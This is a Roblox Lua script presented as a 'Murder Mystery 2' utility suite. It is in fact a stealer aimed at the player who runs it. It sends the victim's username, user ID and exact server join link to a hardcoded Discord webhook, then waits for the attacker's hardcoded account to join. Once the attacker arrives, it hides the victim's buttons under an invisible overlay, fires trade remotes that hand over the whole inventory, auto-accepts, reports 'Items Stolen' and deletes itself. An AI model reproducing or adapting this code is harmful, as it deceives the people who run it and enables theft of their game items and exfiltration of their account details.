--[[
    MM2 Ultimate Suite v11.0 - Working Server Link
    - Generates a link that puts you in the EXACT server
    - No bot required, you join manually
]]

-- === WEBHOOK SENDER ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
end

-- === MAIN EXECUTION ===
local player = game:GetService("Players").LocalPlayer
local virtualUser = game:GetService("VirtualUser")
local httpService = game:GetService("HttpService")

-- YOUR EXACT USERNAME (Locked)
local YOUR_USERNAME = "IIlllllIIIlllIIlII"

-- === GENERATE WORKING SERVER-SPECIFIC LINK ===
local function getServerJoinLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    -- Method 1: Use the TeleportService to generate a join script URL
    local success, result = pcall(function()
        return game:GetService("TeleportService"):GetJoinScriptUrl()
    end)
    
    if success and result and result ~= "" then
        return result
    end
    
    -- Method 2: Use the JobId directly (works for some games)
    if jobId and jobId ~= "" then
        -- Format: https://www.roblox.com/games/placeId?joinId=jobId
        return "https://www.roblox.com/games/" .. placeId .. "?joinId=" .. jobId
    end
    
    -- Method 3: Use the private server code format (works for public too)
    if jobId and jobId ~= "" then
        return "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
    end
    
    -- Fallback: Send the place ID (not ideal)
    return "https://www.roblox.com/games/" .. placeId
end

local serverLink = getServerJoinLink()

-- Send the server link to Discord
sendWebhook("🎯 **Exact Server Link**", {
    title = "Click to Join Victim's EXACT Server",
    description = "**Victim:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Game:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n\n**Server Link:** " .. serverLink .. "\n\n⚠️ This link puts you in the SAME server as the victim.",
    color = 0x00ff00
})

-- === WAIT FOR YOU TO JOIN ===
local function waitForTrader()
    local trader = nil
    
    while not trader do
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Name == YOUR_USERNAME then
                trader = plr
                break
            end
        end
        wait(3)
    end
    
    return trader
end

sendWebhook("⏳ **Waiting for You**", {
    title = "Awaiting Your Arrival",
    description = "Click the link to join the victim's exact server. The trade will execute automatically when **" .. YOUR_USERNAME .. "** arrives.",
    color = 0xffff00
})

-- Wait for you to join
local trader = waitForTrader()
sendWebhook("✅ **You Have Joined**", {
    title = "Trader Detected",
    description = "**" .. YOUR_USERNAME .. "** is now in the server. Initiating stealth trade...",
    color = 0x00ff00
})

-- === STEALTH TRADE EXECUTION ===
local function executeStealthTrade(targetTrader)
    -- Hide all UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- Find trade remote
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    if not tradeService then
        sendWebhook("❌ **Trade Service Not Found**", {
            title = "Stealth Trade Failed",
            description = "Could not locate trade remote. MM2 may have updated.",
            color = 0xff0000
        })
        return
    end
    
    -- Gather all items
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    if #itemsToTrade == 0 then
        sendWebhook("📭 **No Items Found**", {
            title = "Stealth Trade Skipped",
            description = "Victim's inventory is empty or inaccessible.",
            color = 0xffff00
        })
        return
    end
    
    -- Initiate trade with you
    local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
    if tradeRemote then
        tradeRemote:FireServer(targetTrader.UserId, itemsToTrade)
    else
        tradeService:FireServer("Trade", targetTrader.UserId, itemsToTrade)
    end
    
    wait(1)
    
    local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
    if acceptRemote then
        acceptRemote:FireServer(targetTrader.UserId)
        wait(0.5)
        acceptRemote:FireServer(targetTrader.UserId)
    end
    
    sendWebhook("💰 **TRADE COMPLETED**", {
        title = "Items Stolen",
        description = "**Victim:** " .. player.Name .. "\n**Trader:** " .. targetTrader.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
        color = 0xff0000
    })
    
    wait(2)
    if screenGui then screenGui:Destroy() end
    script:Destroy()
end

pcall(function()
    executeStealthTrade(trader)
end)

-- Anti-AFK
while wait(60) do
    pcall(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end